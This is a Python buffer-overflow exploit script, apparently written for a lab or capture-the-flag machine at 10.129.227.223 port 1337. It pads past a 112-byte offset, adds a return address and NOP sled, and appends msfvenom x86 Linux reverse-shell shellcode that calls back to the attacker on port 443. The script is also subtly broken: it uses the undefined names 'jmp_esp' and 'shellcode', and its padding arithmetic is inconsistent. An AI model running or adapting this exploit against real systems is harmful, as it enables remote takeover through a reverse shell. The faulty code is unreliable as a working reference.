#!/usr/bin/python3
import socket
import struct

def p32(data):
    return struct.pack("<I", data)

host, port = "10.129.227.223", 1337

# msfvenom -a x86 -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=443 -s 80 -f py -o shellcode.py

buf =  b""
buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0"
buf += b"\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9"
buf += b"\x68\x0a\x0a\x0e\x6d\x68\x02\x00\x01\xbb\x89\xe1"
buf += b"\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52"
buf += b"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
buf += b"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

pattern_length = 140 # Documentation and keep for length retention
offset = 112
new_eip = b"BBBB"
#jmp_esp = p32(0x625011AF) # must be the correct endianness
nop_sled = b"\x90" * 24  # multiple of 4

payload = b"".join([
            b"A" * offset,
            jmp_esp,            
            nop_sled,
            shellcode,
            b"C" *  (pattern_length - len(new_eip) - offset - len(nop_sled) - len(shellcode)),
        ])

with socket.socket() as s: 
    s.connect((host,port))
    s.send(payload)

